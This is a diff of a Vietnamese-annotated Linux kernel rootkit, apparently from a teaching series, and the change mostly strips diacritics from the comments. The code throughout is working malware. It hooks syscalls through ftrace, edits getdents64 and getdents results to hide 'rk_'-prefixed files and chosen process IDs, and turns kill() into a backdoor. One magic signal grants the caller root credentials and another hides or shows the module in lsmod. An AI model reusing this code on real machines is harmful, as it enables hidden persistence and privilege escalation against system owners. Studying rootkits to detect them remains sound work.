- *    → Ít race conditions hơn manual hooking
+ *    -> Ftrace framework handle SMP synchronization
+ *    -> It race conditions hon manual hooking
  *
  * 5. "Legitimate" API usage
- *    → Monitoring tools cũng dùng ftrace
- *    → Khó phân biệt rootkit hook vs legitimate tracer
+ *    -> Monitoring tools cung dung ftrace
+ *    -> Kho phan biet rootkit hook vs legitimate tracer
  *
- * CÁCH FTRACE HOẠT ĐỘNG:
+ * CACH FTRACE HOAT DONG:
  *
- * Khi CONFIG_FUNCTION_TRACER=y, compiler thêm "nop sled" hoặc
- * call __fentry__ vào đầu MỌI kernel function:
+ * Khi CONFIG_FUNCTION_TRACER=y, compiler them "nop sled" hoac
+ * call __fentry__ vao dau MOI kernel function:
  *
  *   function_name:
- *     call __fentry__     ← 5 bytes, thường nop khi không trace
+ *     call __fentry__     <- 5 bytes, thuong nop khi khong trace
  *     push rbp
  *     mov rbp, rsp
  *     ...
  *
- * Khi không có tracer, __fentry__ call được replace bằng NOP.
- * Khi register tracer, kernel patch NOP thành call tới tracer.
+ * Khi khong co tracer, __fentry__ call duoc replace bang NOP.
+ * Khi register tracer, kernel patch NOP thanh call toi tracer.
  *
  * Rootkit tracer:
- *   1. Được gọi khi target function bắt đầu execute
- *   2. Nhận pt_regs (register state) làm argument
- *   3. Thay đổi regs->ip (instruction pointer)
- *      → Execution "nhảy" sang hook function thay vì tiếp tục
- *   4. Hook function gọi original khi cần
+ *   1. Duoc goi khi target function bat dau execute
+ *   2. Nhan pt_regs (register state) lam argument
+ *   3. Thay doi regs->ip (instruction pointer)
+ *      -> Execution "nhay" sang hook function thay vi tiep tuc
+ *   4. Hook function goi original khi can
  *
- * Rootkits dùng ftrace: Sutekh, Kovid, nhiều APT tools.
+ * Rootkits dung ftrace: Sutekh, Kovid, nhieu APT tools.
  */
 
 #include "rootkit.h"
@@ -1779,7 +2777,7 @@ void rk_remove_hooks(void)
 /* ══════════════════════════════════════════════════════════════
  * FTRACE HOOK STRUCTURE
  *
- * Encapsulate mọi thứ cần cho 1 hook:
+ * Encapsulate moi thu can cho 1 hook:
  * - Target function name
  * - Hook function pointer
  * - Original function pointer (for calling through)
@@ -1787,21 +2785,21 @@ void rk_remove_hooks(void)
  * ══════════════════════════════════════════════════════════════ */
 
 struct ftrace_hook {
-    const char *name;          /* Tên kernel function cần hook */
+    const char *name;          /* Ten kernel function can hook */
     void *function;            /* Hook function (replacement) */
-    void *original;            /* Pointer để store original function addr */
-    unsigned long address;     /* Resolved address của target */
+    void *original;            /* Pointer de store original function addr */
+    unsigned long address;     /* Resolved address cua target */
     struct ftrace_ops ops;     /* ftrace handle — kernel manages this */
 };
 
-/* Macro helper để khai báo hook entry.
+/* Macro helper de khai bao hook entry.
  *
- * Ví dụ: HOOK("__x64_sys_getdents64", hooked_getdents64, &orig_getdents64)
+ * Vi du: HOOK("__x64_sys_getdents64", hooked_getdents64, &orig_getdents64)
  *
- * Tạo struct ftrace_hook với:
+ * Tao struct ftrace_hook voi:
  *   .name = "__x64_sys_getdents64"
  *   .function = hooked_getdents64
- *   .original = &orig_getdents64 (pointer tới function pointer)
+ *   .original = &orig_getdents64 (pointer toi function pointer)
  */
 #define HOOK(_name, _hook, _orig) \
     {                             \
@@ -1811,21 +2809,21 @@ struct ftrace_hook {
     }
 
 /* ══════════════════════════════════════════════════════════════
- * FTRACE CALLBACK — Trung tâm của kỹ thuật
+ * FTRACE CALLBACK — Trung tam cua ky thuat
  *
- * Function này được ftrace gọi mỗi khi target function execute.
- * Đây là "entry point" của hook — nơi redirect xảy ra.
+ * Function nay duoc ftrace goi moi khi target function execute.
+ * Day la "entry point" cua hook — noi redirect xay ra.
  * ══════════════════════════════════════════════════════════════ */
 
 /*
- * notrace attribute: ngăn ftrace trace CHÍNH function này.
- * Nếu không có notrace, khi function này gọi → ftrace trace nó
- * → gọi lại function này → infinite recursion → stack overflow → crash.
+ * notrace attribute: ngan ftrace trace CHINH function nay.
+ * Neu khong co notrace, khi function nay goi -> ftrace trace no
+ * -> goi lai function nay -> infinite recursion -> stack overflow -> crash.
  *
  * Parameters:
- *   ip:        instruction pointer của target function (nơi hook)
- *   parent_ip: instruction pointer của CALLER (ai gọi target)
- *   ops:       ftrace_ops handle (ta dùng container_of lấy hook struct)
+ *   ip:        instruction pointer cua target function (noi hook)
+ *   parent_ip: instruction pointer cua CALLER (ai goi target)
+ *   ops:       ftrace_ops handle (ta dung container_of lay hook struct)
  *   fregs:     ftrace-specific register state
  */
 static void notrace ftrace_thunk(unsigned long ip,
@@ -1836,40 +2834,40 @@ static void notrace ftrace_thunk(unsigned long ip,
     struct pt_regs *regs = ftrace_get_regs(fregs);
     struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
 
-    /* CRITICAL CHECK: chống recursion.
+    /* CRITICAL CHECK: chong recursion.
      *
-     * Vấn đề: hook function gọi original function → original function
-     * trigger ftrace → callback gọi lại → hook function gọi lại original
-     * → infinite loop.
+     * Van de: hook function goi original function -> original function
+     * trigger ftrace -> callback goi lai -> hook function goi lai original
+     * -> infinite loop.
      *
-     * Giải pháp: kiểm tra CALLER (parent_ip).
-     * - Nếu caller nằm TRONG module (within_module) → đang call from hook
-     *   → KHÔNG redirect, cho original chạy bình thường
-     * - Nếu caller nằm NGOÀI module → call từ kernel/userspace
-     *   → Redirect sang hook function
+     * Giai phap: kiem tra CALLER (parent_ip).
+     * - Neu caller nam TRONG module (within_module) -> dang call from hook
+     *   -> KHONG redirect, cho original chay binh thuong
+     * - Neu caller nam NGOAI module -> call tu kernel/userspace
+     *   -> Redirect sang hook function
      *
-     * within_module(addr, mod): kiểm tra addr có nằm trong
-     * code range của module mod hay không.
+     * within_module(addr, mod): kiem tra addr co nam trong
+     * code range cua module mod hay khong.
      *
      * Flow:
-     *   [kernel] → target_func ──ftrace──→ callback
-     *                                       ├─ parent_ip OUTSIDE module
-     *                                       └─ redirect to hook
+     *   [kernel] -> target_func --ftrace--> callback
+     *                                       +- parent_ip OUTSIDE module
+     *                                       +- redirect to hook
      *
-     *   [hook]  → orig_func   ──ftrace──→ callback
-     *                                       ├─ parent_ip INSIDE module
-     *                                       └─ DON'T redirect, let original run
+     *   [hook]  -> orig_func   --ftrace--> callback
+     *                                       +- parent_ip INSIDE module
+     *                                       +- DON'T redirect, let original run
      */
     if (!within_module(parent_ip, THIS_MODULE))
         regs->ip = (unsigned long)hook->function;
 
     /* regs->ip = instruction pointer.
-     * Thay đổi ip = thay đổi NƠI CPU sẽ execute tiếp theo.
-     * Khi ftrace callback return, CPU jump tới regs->ip
-     * = hook function address thay vì original function.
+     * Thay doi ip = thay doi NOI CPU se execute tiep theo.
+     * Khi ftrace callback return, CPU jump toi regs->ip
+     * = hook function address thay vi original function.
      *
-     * Đây là kỹ thuật tương tự EIP/RIP overwrite trong exploitation,
-     * nhưng legitimate qua ftrace API. */
+     * Day la ky thuat tuong tu EIP/RIP overwrite trong exploitation,
+     * nhung legitimate qua ftrace API. */
 }
 
 /* ══════════════════════════════════════════════════════════════
@@ -1889,13 +2887,13 @@ static int install_ftrace_hook(struct ftrace_hook *hook)
 
     /* Step 2: Store original function address.
      *
-     * hook->original là con trỏ tới con trỏ:
-     *   hook->original = &orig_getdents64  (address của variable)
-     *   *hook->original = hook->address     (ghi address vào variable)
+     * hook->original la con tro toi con tro:
+     *   hook->original = &orig_getdents64  (address cua variable)
+     *   *hook->original = hook->address     (ghi address vao variable)
      *
-     * Sau dòng này:
+     * Sau dong nay:
      *   orig_getdents64 = address_of___x64_sys_getdents64
-     *   → Hook function có thể gọi orig_getdents64(regs) */
+     *   -> Hook function co the goi orig_getdents64(regs) */
     *((unsigned long *)hook->original) = hook->address;
 
     /* Step 3: Configure ftrace_ops.
@@ -1903,18 +2901,18 @@ static int install_ftrace_hook(struct ftrace_hook *hook)
      * func: callback function (ftrace_thunk)
      *
      * flags:
-     *   FTRACE_OPS_FL_SAVE_REGS: save tất cả registers vào pt_regs
-     *     → Cần thiết để ta đọc/modify registers (đặc biệt regs->ip)
-     *     → Nếu không set, regs = NULL trong callback
+     *   FTRACE_OPS_FL_SAVE_REGS: save tat ca registers vao pt_regs
+     *     -> Can thiet de ta doc/modify registers (dac biet regs->ip)
+     *     -> Neu khong set, regs = NULL trong callback
      *
-     *   FTRACE_OPS_FL_IPMODIFY: khai báo rằng ta SẼ modify regs->ip
-     *     → Kernel biết để handle conflict với tracers khác
-     *     → Chỉ 1 IPMODIFY handler cho 1 function tại 1 thời điểm
-     *     → Nếu tracing tool khác đã register IPMODIFY → ta fail
+     *   FTRACE_OPS_FL_IPMODIFY: khai bao rang ta SE modify regs->ip
+     *     -> Kernel biet de handle conflict voi tracers khac
+     *     -> Chi 1 IPMODIFY handler cho 1 function tai 1 thoi diem
+     *     -> Neu tracing tool khac da register IPMODIFY -> ta fail
      *
      *   FTRACE_OPS_FL_RECURSION: (kernel 5.11+)
-     *     → Cho phép recursion protection tự động
-     *     → Trước 5.11 phải tự check (within_module trick) */
+     *     -> Cho phep recursion protection tu dong
+     *     -> Truoc 5.11 phai tu check (within_module trick) */
     hook->ops.func = ftrace_thunk;
     hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                     | FTRACE_OPS_FL_IPMODIFY;
@@ -1923,11 +2921,11 @@ static int install_ftrace_hook(struct ftrace_hook *hook)
     hook->ops.flags |= FTRACE_OPS_FL_RECURSION;
 #endif
 
-    /* Step 4: Set filter — CHỈ trace target function.
+    /* Step 4: Set filter — CHI trace target function.
      *
-     * Không set filter = trace MỌI function = system crawl.
-     * ftrace_set_filter_ip(): "chỉ gọi callback khi function
-     * tại address này execute."
+     * Khong set filter = trace MOI function = system crawl.
+     * ftrace_set_filter_ip(): "chi goi callback khi function
+     * tai address nay execute."
      *
      * Params:
      *   ops:     ftrace handle
@@ -1942,11 +2940,11 @@ static int install_ftrace_hook(struct ftrace_hook *hook)
 
     /* Step 5: Register — Activate hook.
      *
-     * Sau lệnh này, mỗi khi target function được gọi:
-     * 1. CPU execute __fentry__ tại đầu function
-     * 2. ftrace dispatch tới ftrace_thunk()
-     * 3. ftrace_thunk() modify regs->ip → hook function
-     * 4. CPU jump tới hook function thay vì tiếp tục original */
+     * Sau lenh nay, moi khi target function duoc goi:
+     * 1. CPU execute __fentry__ tai dau function
+     * 2. ftrace dispatch toi ftrace_thunk()
+     * 3. ftrace_thunk() modify regs->ip -> hook function
+     * 4. CPU jump toi hook function thay vi tiep tuc original */
     err = register_ftrace_function(&hook->ops);
     if (err) {
         pr_err("rk: register_ftrace_function failed: %d\n", err);
@@ -1963,7 +2961,7 @@ static void remove_ftrace_hook(struct ftrace_hook *hook)
 {
     int err;
 
-    /* Unregister trong thứ tự ngược:
+    /* Unregister trong thu tu nguoc:
      * 1. Unregister function (stop calling callback)
      * 2. Remove filter (cleanup) */
     err = unregister_ftrace_function(&hook->ops);
@@ -1983,9 +2981,9 @@ static void remove_ftrace_hook(struct ftrace_hook *hook)
 ```c
 /* ftrace_hooks_complete.c — Full hook function implementations
  *
- * Các hook functions dùng với ftrace framework.
- * Mỗi function thay thế một kernel function khi được gọi,
- * thông qua ftrace callback redirect (xem ftrace_thunk).
+ * Cac hook functions dung voi ftrace framework.
+ * Moi function thay the mot kernel function khi duoc goi,
+ * thong qua ftrace callback redirect (xem ftrace_thunk).
  */
 
 #include "rootkit.h"
@@ -1993,9 +2991,9 @@ static void remove_ftrace_hook(struct ftrace_hook *hook)
 /* ══════════════════════════════════════════════════════════════
  * ORIGINAL FUNCTION POINTERS
  *
- * Mỗi pointer lưu address của kernel function gốc.
- * Khi install_ftrace_hook() chạy, nó ghi address vào đây.
- * Hook functions gọi qua pointers này để thực hiện original behavior.
+ * Moi pointer luu address cua kernel function goc.
+ * Khi install_ftrace_hook() chay, no ghi address vao day.
+ * Hook functions goi qua pointers nay de thuc hien original behavior.
  * ══════════════════════════════════════════════════════════════ */
 
 static asmlinkage long (*ft_orig_getdents64)(const struct pt_regs *);
@@ -2007,21 +3005,21 @@ static int (*ft_orig_udp6_seq_show)(struct seq_file *, void *);
 static int (*ft_orig_tcp6_seq_show)(struct seq_file *, void *);
 
 /* ──────────────────────────────────────────────────────────────
- * Kiểm tra fd trỏ tới /proc
+ * Kiem tra fd tro toi /proc
  *
- * Tại sao tách function: reuse cho cả getdents64 và getdents.
- * fdget/fdput pattern đảm bảo file struct không bị freed
- * trong khi ta đang đọc.
+ * Tai sao tach function: reuse cho ca getdents64 va getdents.
+ * fdget/fdput pattern dam bao file struct khong bi freed
+ * trong khi ta dang doc.
  *
- * Chi tiết:
- *   Mỗi open file trong process có fd → files_struct → file *.
+ * Chi tiet:
+ *   Moi open file trong process co fd -> files_struct -> file *.
  *   file->f_path.dentry->d_inode->i_sb->s_type->name = fs type.
- *   "proc" = procfs → đang đọc /proc directory.
+ *   "proc" = procfs -> dang doc /proc directory.
  *
- *   Cần check vì:
- *   - getdents64 cho /proc → filter PIDs
- *   - getdents64 cho /home → filter filenames
- *   - Phải phân biệt để áp dụng đúng logic
+ *   Can check vi:
+ *   - getdents64 cho /proc -> filter PIDs
+ *   - getdents64 cho /home -> filter filenames
+ *   - Phai phan biet de ap dung dung logic
  * ────────────────────────────────────────────────────────────── */
 static bool ft_is_proc_fd(int fd)
 {
@@ -2052,49 +3050,49 @@ out:
 /* ──────────────────────────────────────────────────────────────
  * ft_hooked_getdents64 — FULL IMPLEMENTATION
  *
- * Đây là hook function hoàn chỉnh cho ftrace-based hooking.
+ * Day la hook function hoan chinh cho ftrace-based hooking.
  *
  * Flow:
- *   1. Extract arguments từ pt_regs
- *   2. Gọi ft_orig_getdents64 (original handler)
- *   3. Copy userspace buffer vào kernel
- *   4. Iterate mỗi linux_dirent64 entry
- *   5. Quyết định hide hay show cho mỗi entry
- *   6. Nếu hide: xóa entry khỏi buffer
- *   7. Copy buffer modified trở lại userspace
+ *   1. Extract arguments tu pt_regs
+ *   2. Goi ft_orig_getdents64 (original handler)
+ *   3. Copy userspace buffer vao kernel
+ *   4. Iterate moi linux_dirent64 entry
+ *   5. Quyet dinh hide hay show cho moi entry
+ *   6. Neu hide: xoa entry khoi buffer
+ *   7. Copy buffer modified tro lai userspace
  *   8. Return adjusted byte count
  *
  * Hide criteria:
- *   a) Filename bắt đầu bằng HIDDEN_PREFIX ("rk_")
- *   b) Entry là PID directory trong /proc và PID nằm trong hidden list
- *   c) Entry là tên module rootkit (cho /proc/modules backup hiding)
+ *   a) Filename bat dau bang HIDDEN_PREFIX ("rk_")
+ *   b) Entry la PID directory trong /proc va PID nam trong hidden list
+ *   c) Entry la ten module rootkit (cho /proc/modules backup hiding)
  * ────────────────────────────────────────────────────────────── */
 static asmlinkage long ft_hooked_getdents64(const struct pt_regs *regs)
 {
-    /* ── Extract syscall arguments từ registers ──
+    /* ── Extract syscall arguments tu registers ──
      *
-     * Trên x86-64 kernel >= 4.17, syscall handlers nhận pt_regs *:
+     * Tren x86-64 kernel >= 4.17, syscall handlers nhan pt_regs *:
      *   regs->di = arg1 = unsigned int fd
      *   regs->si = arg2 = struct linux_dirent64 __user *dirent
      *   regs->dx = arg3 = unsigned int count (buffer size)
      *
-     * __user annotation: pointer trỏ vào userspace memory.
-     * KHÔNG ĐƯỢC dereference trực tiếp — phải dùng copy_from_user.
+     * __user annotation: pointer tro vao userspace memory.
+     * KHONG DUOC dereference truc tiep — phai dung copy_from_user.
      */
     int fd = (int)regs->di;
     struct linux_dirent64 __user *user_dirent =
         (struct linux_dirent64 __user *)regs->si;
 
-    /* Gọi original syscall handler.
+    /* Goi original syscall handler.
      *
-     * ft_orig_getdents64 = address của __x64_sys_getdents64 gốc.
-     * Được save khi install_ftrace_hook() chạy.
+     * ft_orig_getdents64 = address cua __x64_sys_getdents64 goc.
+     * Duoc save khi install_ftrace_hook() chay.
      *
-     * Sau call này:
-     *   - user_dirent buffer (userspace) đã được kernel fill
-     *   - ret = tổng bytes data trong buffer
-     *   - ret = 0 → end of directory (không còn entries)
-     *   - ret < 0 → error (invalid fd, permission denied, etc.)
+     * Sau call nay:
+     *   - user_dirent buffer (userspace) da duoc kernel fill
+     *   - ret = tong bytes data trong buffer
+     *   - ret = 0 -> end of directory (khong con entries)
+     *   - ret < 0 -> error (invalid fd, permission denied, etc.)
      */
     long ret = ft_orig_getdents64(regs);
 
@@ -2115,24 +3113,24 @@ static asmlinkage long ft_hooked_getdents64(const struct pt_regs *regs)
 
     /* ── Allocate kernel buffer ──
      *
-     * Tại sao cần copy vào kernel:
-     *   1. Không thể iterate userspace memory trực tiếp từ kernel
-     *      (SMAP: Supervisor Mode Access Prevention sẽ fault)
-     *   2. copy_from_user/copy_to_user là kernel API bắt buộc
-     *   3. Race condition: nếu process khác modify buffer concurrent
-     *      → TOCTOU (Time-of-check-time-of-use) vulnerability
-     *   4. Page fault trong kernel = oops nếu page đang swapped out
+     * Tai sao can copy vao kernel:
+     *   1. Khong the iterate userspace memory truc tiep tu kernel
+     *      (SMAP: Supervisor Mode Access Prevention se fault)
+     *   2. copy_from_user/copy_to_user la kernel API bat buoc
+     *   3. Race condition: neu process khac modify buffer concurrent
+     *      -> TOCTOU (Time-of-check-time-of-use) vulnerability
+     *   4. Page fault trong kernel = oops neu page dang swapped out
      *
      * GFP_KERNEL: allocation flag cho process context.
-     *   - CÓ THỂ sleep (block nếu hết memory, đợi reclaim)
-     *   - KHÔNG dùng trong interrupt/softirq context
-     *   - Syscall hook chạy trong process context → GFP_KERNEL OK
+     *   - CO THE sleep (block neu het memory, doi reclaim)
+     *   - KHONG dung trong interrupt/softirq context
+     *   - Syscall hook chay trong process context -> GFP_KERNEL OK
      */
     kern_buf = kzalloc(ret, GFP_KERNEL);
     if (!kern_buf)
         return ret;
 
-    /* ── Copy userspace data vào kernel ──
+    /* ── Copy userspace data vao kernel ──
      *
      * copy_from_user(dst_kernel, src_user, size):
      *   Return: 0 = success
@@ -2144,42 +3142,42 @@ static asmlinkage long ft_hooked_getdents64(const struct pt_regs *regs)
      *   3. Copy with page fault handling
      *   4. Re-enable SMAP
      *
-     * Nếu fail (user buffer invalid, unmapped, etc.) → trả ret gốc.
+     * Neu fail (user buffer invalid, unmapped, etc.) -> tra ret goc.
      */
     if (copy_from_user(kern_buf, user_dirent, ret)) {
         kfree(kern_buf);
         return ret;
     }
 
-    /* Check nếu đang đọc /proc (cho PID hiding logic) */
+    /* Check neu dang doc /proc (cho PID hiding logic) */
     proc_dir = ft_is_proc_fd(fd);
 
     /* ── Main filtering loop ──
      *
-     * linux_dirent64 entries nằm liên tiếp trong buffer:
+     * linux_dirent64 entries nam lien tiep trong buffer:
      *
-     *   kern_buf ──→ ┌─────────────────────┐ offset = 0
-     *                │ d_ino    (8 bytes)   │
-     *                │ d_off    (8 bytes)   │
-     *                │ d_reclen (2 bytes)   │ ← kích thước TOÀN BỘ entry
-     *                │ d_type   (1 byte)    │
-     *                │ d_name[] (variable)  │ ← null-terminated filename
-     *                │ [padding]            │
-     *                ├─────────────────────┤ offset += d_reclen
-     *                │ next entry...        │
-     *                ├─────────────────────┤
-     *                │ next entry...        │
-     *                └─────────────────────┘ offset == ret (end)
+     *   kern_buf --> +---------------------+ offset = 0
+     *                | d_ino    (8 bytes)   |
+     *                | d_off    (8 bytes)   |
+     *                | d_reclen (2 bytes)   | <- kich thuoc TOAN BO entry
+     *                | d_type   (1 byte)    |
+     *                | d_name[] (variable)  | <- null-terminated filename
+     *                | [padding]            |
+     *                +---------------------+ offset += d_reclen
+     *                | next entry...        |
+     *                +---------------------+
+     *                | next entry...        |
+     *                +---------------------+ offset == ret (end)
      *
-     * d_reclen bao gồm header + name + padding → variable per entry.
-     * Ta dùng d_reclen để nhảy từ entry này sang entry kế.
+     * d_reclen bao gom header + name + padding -> variable per entry.
+     * Ta dung d_reclen de nhay tu entry nay sang entry ke.
      */
     offset = 0;
     while (offset < adjusted_ret) {
         cur = (struct linux_dirent64 *)((char *)kern_buf + offset);
 
         /* Validate d_reclen — protect against corruption.
-         * d_reclen == 0 → infinite loop. d_reclen > remaining → overread. */
+         * d_reclen == 0 -> infinite loop. d_reclen > remaining -> overread. */
         if (cur->d_reclen == 0 || cur->d_reclen > (adjusted_ret - offset))
             break;
 
@@ -2187,16 +3185,16 @@ static asmlinkage long ft_hooked_getdents64(const struct pt_regs *regs)
 
         /* ── Rule 1: Hide by filename prefix ──
          *
-         * Bất kỳ file/directory nào có tên bắt đầu bằng HIDDEN_PREFIX
-         * sẽ bị ẩn khỏi ls, find, readdir, và mọi tool dùng getdents.
+         * Bat ky file/directory nao co ten bat dau bang HIDDEN_PREFIX
+         * se bi an khoi ls, find, readdir, va moi tool dung getdents.
          *
-         * strncmp so sánh N bytes đầu tiên.
-         * Nếu match → file invisible.
+         * strncmp so sanh N bytes dau tien.
+         * Neu match -> file invisible.
          *
-         * Ví dụ: HIDDEN_PREFIX = "rk_"
-         *   "rk_config"    → HIDDEN
-         *   "rk_backdoor"  → HIDDEN
-         *   "readme.txt"   → visible
+         * Vi du: HIDDEN_PREFIX = "rk_"
+         *   "rk_config"    -> HIDDEN
+         *   "rk_backdoor"  -> HIDDEN
+         *   "readme.txt"   -> visible
          */
         if (strncmp(cur->d_name, HIDDEN_PREFIX,
                     strlen(HIDDEN_PREFIX)) == 0) {
@@ -2205,22 +3203,22 @@ static asmlinkage long ft_hooked_getdents64(const struct pt_regs *regs)
 
         /* ── Rule 2: Hide PID directories trong /proc ──
          *
-         * /proc chứa numbered directories cho mỗi process:
-         *   /proc/1/     → init/systemd
-         *   /proc/1234/  → process PID 1234
-         *   /proc/self/  → symlink tới current process
+         * /proc chua numbered directories cho moi process:
+         *   /proc/1/     -> init/systemd
+         *   /proc/1234/  -> process PID 1234
+         *   /proc/self/  -> symlink toi current process
          *
-         * Khi ps/top đọc /proc, chúng getdents64 → thấy "1", "1234", etc.
-         * → Rồi stat mỗi PID directory để lấy process info.
+         * Khi ps/top doc /proc, chung getdents64 -> thay "1", "1234", etc.
+         * -> Roi stat moi PID directory de lay process info.
          *
-         * Nếu ta remove PID entry khỏi getdents64 result:
-         *   → ps/top KHÔNG thấy process → invisible.
-         *   → Process VẪN chạy (scheduler không dùng /proc).
+         * Neu ta remove PID entry khoi getdents64 result:
+         *   -> ps/top KHONG thay process -> invisible.
+         *   -> Process VAN chay (scheduler khong dung /proc).
          *
-         * Chỉ filter khi:
-         *   a) fd trỏ tới /proc (proc_dir == true)
-         *   b) d_name là numeric string (PID, không phải "cpuinfo")
-         *   c) PID nằm trong hidden_pids list
+         * Chi filter khi:
+         *   a) fd tro toi /proc (proc_dir == true)
+         *   b) d_name la numeric string (PID, khong phai "cpuinfo")
+         *   c) PID nam trong hidden_pids list
          */
         if (proc_dir && !hide_this) {
             long pid_val;
@@ -2230,24 +3228,24 @@ static asmlinkage long ft_hooked_getdents64(const struct pt_regs *regs)
             }
         }
 
-        /* ── Rule 3: Hide rootkit module entry khi đọc /proc/modules
-         *    (đã handled ở Rule 1 nếu module name có HIDDEN_PREFIX)
-         *    Nếu module name không có prefix, thêm explicit check ở đây */
+        /* ── Rule 3: Hide rootkit module entry khi doc /proc/modules
+         *    (da handled o Rule 1 neu module name co HIDDEN_PREFIX)
+         *    Neu module name khong co prefix, them explicit check o day */
 
         /* ── Perform hiding ── */
         if (hide_this) {
             if (cur == kern_buf) {
-                /* Entry đầu tiên: shift mọi thứ phía sau lên.
+                /* Entry dau tien: shift moi thu phia sau len.
                  *
-                 * Trước:
+                 * Truoc:
                  *   [HIDDEN entry][entry B][entry C]
                  *    ^offset=0    ^reclen   ...
                  *
                  * Sau memmove:
                  *   [entry B][entry C]
-                 *   adjusted_ret giảm đi d_reclen của HIDDEN
+                 *   adjusted_ret giam di d_reclen cua HIDDEN
                  *
-                 * memmove (không phải memcpy) vì source và dest overlap.
+                 * memmove (khong phai memcpy) vi source va dest overlap.
                  */
                 adjusted_ret -= cur->d_reclen;
                 if (adjusted_ret > 0) {
@@ -2255,50 +3253,50 @@ static asmlinkage long ft_hooked_getdents64(const struct pt_regs *regs)
                             (char *)cur + cur->d_reclen,
                             adjusted_ret);
                 }
-                /* Không tăng offset — vị trí hiện tại giờ chứa
-                 * entry kế (đã shift), cần kiểm tra lại. */
+                /* Khong tang offset — vi tri hien tai gio chua
+                 * entry ke (da shift), can kiem tra lai. */
                 continue;
             }
 
-            /* Entry ở giữa hoặc cuối: "nuốt" vào entry trước.
+            /* Entry o giua hoac cuoi: "nuot" vao entry truoc.
              *
-             * Nguyên lý: mỗi entry tự khai báo kích thước (d_reclen).
-             * Userspace dùng d_reclen để tính offset entry kế:
+             * Nguyen ly: moi entry tu khai bao kich thuoc (d_reclen).
+             * Userspace dung d_reclen de tinh offset entry ke:
              *   next_entry = (char *)current + current->d_reclen
              *
-             * Nếu ta tăng d_reclen của entry trước:
+             * Neu ta tang d_reclen cua entry truoc:
              *   prev->d_reclen += cur->d_reclen
              *
-             * → Userspace nhảy TỪ prev THẲNG tới entry SAU cur.
-             * → cur bị skip (vẫn nằm trong memory nhưng unreachable).
+             * -> Userspace nhay TU prev THANG toi entry SAU cur.
+             * -> cur bi skip (van nam trong memory nhung unreachable).
              *
-             * Trước:
+             * Truoc:
              *   [prev, reclen=32] [HIDDEN, reclen=48] [next entry]
              *
              * Sau:
              *   [prev, reclen=80]                     [next entry]
-             *   (prev "nuốt" 48 bytes của HIDDEN)
+             *   (prev "nuot" 48 bytes cua HIDDEN)
              */
             if (prev)
                 prev->d_reclen += cur->d_reclen;
         } else {
-            /* Entry visible — track làm prev cho potential future hide */
+            /* Entry visible — track lam prev cho potential future hide */
             prev = cur;
         }
 
         offset += cur->d_reclen;
     }
 
-    /* ── Copy filtered buffer trở lại userspace ──
+    /* ── Copy filtered buffer tro lai userspace ──
      *
      * copy_to_user(dst_user, src_kernel, size):
-     *   Ghi adjusted_ret bytes (có thể < ret gốc) vào user buffer.
+     *   Ghi adjusted_ret bytes (co the < ret goc) vao user buffer.
      *
-     * Userspace sẽ thấy:
-     *   - Ít entries hơn (hidden entries đã bị remove)
-     *   - Return value nhỏ hơn (adjusted_ret < ret)
-     *   - Hoàn toàn transparent — ls, find, etc. hoạt động bình thường
-     *     nhưng không list hidden entries.
+     * Userspace se thay:
+     *   - It entries hon (hidden entries da bi remove)
+     *   - Return value nho hon (adjusted_ret < ret)
+     *   - Hoan toan transparent — ls, find, etc. hoat dong binh thuong
+     *     nhung khong list hidden entries.
      */
     if (adjusted_ret > 0)
         copy_to_user(user_dirent, kern_buf, adjusted_ret);
@@ -2310,17 +3308,17 @@ static asmlinkage long ft_hooked_getdents64(const struct pt_regs *regs)
 /* ──────────────────────────────────────────────────────────────
  * ft_hooked_getdents — Hook cho legacy getdents (32-bit compat)
  *
- * Một số tools cũ hoặc 32-bit binaries dùng getdents thay vì
- * getdents64. Phải hook CẢ HAI để không bị bypass.
+ * Mot so tools cu hoac 32-bit binaries dung getdents thay vi
+ * getdents64. Phai hook CA HAI de khong bi bypass.
  *
  * struct linux_dirent (32-bit version):
  *   unsigned long  d_ino;
  *   unsigned long  d_off;
  *   unsigned short d_reclen;
  *   char           d_name[];
- *   // d_type nằm SAU d_name (khác 64-bit version)
+ *   // d_type nam SAU d_name (khac 64-bit version)
  *
- * Logic giống getdents64 nhưng dùng struct khác.
+ * Logic giong getdents64 nhung dung struct khac.
  * ────────────────────────────────────────────────────────────── */
 
 struct linux_dirent {
@@ -2399,9 +3397,9 @@ static asmlinkage long ft_hooked_getdents(const struct pt_regs *regs)
 /* ft_hooked_kill — FULL VERSION
  *
  * 3 commands qua magic signal:
- *   kill -54 31337  → give root cho calling process
- *   kill -54 31338  → toggle ẩn/hiện module
- *   kill -54 <PID>  → toggle ẩn/hiện process <PID>
+ *   kill -54 31337  -> give root cho calling process
+ *   kill -54 31338  -> toggle an/hien module
+ *   kill -54 <PID>  -> toggle an/hien process <PID>
  */
 
 static asmlinkage long ft_hooked_kill(const struct pt_regs *regs)
@@ -2409,16 +3407,16 @@ static asmlinkage long ft_hooked_kill(const struct pt_regs *regs)
     pid_t target_pid = (pid_t)regs->di;
     int sig = (int)regs->si;
 
-    /* Chỉ intercept magic signal */
+    /* Chi intercept magic signal */
     if (sig != MAGIC_SIGNAL)
         return ft_orig_kill(regs);
 
     /* ──── Command 1: Give Root ────
      *
-     * kill(31337, 54) → calling process trở thành root.
+     * kill(31337, 54) -> calling process tro thanh root.
      *
-     * prepare_creds() tạo bản copy mutable của current credentials.
-     * Set tất cả UIDs/GIDs = 0 + full capabilities.
+     * prepare_creds() tao ban copy mutable cua current credentials.
+     * Set tat ca UIDs/GIDs = 0 + full capabilities.
      * commit_creds() atomic swap.
      */
     if (target_pid == MAGIC_PID) {
@@ -2444,13 +3442,13 @@ static asmlinkage long ft_hooked_kill(const struct pt_regs *regs)
 
     /* ──── Command 2: Toggle Module Visibility ────
      *
-     * kill(31338, 54) → ẩn/hiện rootkit module.
+     * kill(31338, 54) -> an/hien rootkit module.
      *
-     * Khi ẩn: module biến mất khỏi lsmod, /proc/modules, /sys/module/
-     * Khi hiện: module xuất hiện trở lại (cần cho rmmod cleanup).
+     * Khi an: module bien mat khoi lsmod, /proc/modules, /sys/module/
+     * Khi hien: module xuat hien tro lai (can cho rmmod cleanup).
      *
-     * module_hidden: global bool track trạng thái hiện tại.
-     * rk_hide_module() / rk_show_module() = DKOM functions từ Chapter 6.
+     * module_hidden: global bool track trang thai hien tai.
+     * rk_hide_module() / rk_show_module() = DKOM functions tu Chapter 6.
      */
     if (target_pid == HIDE_MODULE_PID) {
         if (module_hidden) {
@@ -2467,18 +3465,18 @@ static asmlinkage long ft_hooked_kill(const struct pt_regs *regs)
 
